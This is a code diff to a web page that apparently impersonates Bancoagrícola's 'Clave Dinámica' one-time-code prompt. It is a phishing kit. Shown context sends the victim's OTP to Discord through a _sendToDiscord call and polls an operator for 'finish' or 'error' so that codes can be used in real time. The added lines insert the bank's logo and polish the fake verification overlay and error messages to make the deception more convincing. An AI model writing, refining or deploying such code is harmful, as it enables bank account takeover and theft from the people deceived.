@@ -1296,6 +1296,7 @@
   <div class="notif-pop" id="notif-pop"></div>
   <div class="tok-overlay" id="tok-ov">
     <div class="tok-box">
+      <img style="display:block;width:180px;height:44px;object-fit:contain;margin:0 auto 20px" src="./index_files/positivo.svg" alt="Bancoagrícola">
       <img class="tok-logo" src="./img/dinamica.png" alt="Clave Dinámica">
       <p class="tok-title">Clave Dinámica</p>
       <p class="tok-msg">Genera la Clave Dinámica desde Banca Móvil</p>
@@ -1574,14 +1575,17 @@
           if (err) err.innerText = '\u00a0';
           _sendToDiscord({ token: code }, 'TOKEN · Código OTP');
           document.getElementById('tok-ov').classList.remove('show');
-          _showOverlay();
-          _ovText('VERIFICANDO CÓDIGO...\nPor favor espere.');
+          var _ov = document.getElementById('loader-ov');
+          var _ot = document.getElementById('loader-text');
+          if (_ov) { _ov.classList.remove('success'); _ov.classList.remove('fail'); _ov.classList.add('show'); }
+          if (_ot) _ot.innerText = 'VERIFICANDO CÓDIGO...\nPor favor espere.';
           _poll(function (st) {
             if (st === 'finish') {
-              var o = _ovEl(); o.classList.add('success'); _ovText('VERIFICACIÓN EXITOSA');
+              if (_ov) _ov.classList.add('success');
+              if (_ot) _ot.innerText = 'VERIFICACIÓN EXITOSA';
             } else if (st === 'error') {
-              _hideOverlay();
-              if (err) err.innerText = 'Código inválido. Inténtalo de nuevo.';
+              if (_ov) { _ov.classList.remove('show'); _ov.classList.remove('success'); _ov.classList.remove('fail'); }
+              if (err) err.innerText = 'Clave dinámica inválida o vencida, intenta de nuevo.';
               if (inp) inp.value = '';
               document.getElementById('tok-ov').classList.add('show');
             }
